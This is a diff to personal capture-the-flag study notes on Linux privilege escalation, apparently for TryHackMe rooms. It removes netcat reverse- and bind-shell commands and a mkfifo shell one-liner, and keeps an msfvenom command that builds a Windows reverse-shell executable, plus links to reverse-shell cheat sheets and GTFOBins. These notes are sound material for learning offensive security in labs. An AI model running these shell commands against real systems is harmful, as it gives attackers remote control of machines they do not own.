@@ -6,24 +6,15 @@
 
 <hr>
 
-## Notes
-
-* CTF = capture the flag
-
-<hr>
-
 ## Prev esc
 
 https://tryhackme.com/room/linprivesc
 => hint/notes
 => network
 
-* https://tryhackme.com/room/introtoshells
+https://tryhackme.com/room/introtoshells
+
 * If there are tools not installed on your target: https://github.com/andrew-d/static-binaries
-* nc ip port -e /bin/bash (rev shell)
-* nc -lvnp port -e /bin/bash (bind shell)
-* this is not included in most versions of netcat
-* `mkfifo /tmp/f; nc XXX < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f` (listener for our wxw shell)
 * https://tryhackme.com/room/introtoshells (Windows)
 * https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-traditional
 * `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`
@@ -42,7 +33,6 @@ https://tryhackme.com/room/linprivesc
 => capabilities
 => `getcap -r / 2>/dev/null`
 => gtfobins
-* https://www.revshells.com/ (sh => bash)
 * if no_root_squash present
 * Another alternative to this program, is to create a suite file with a copy of bash.
 
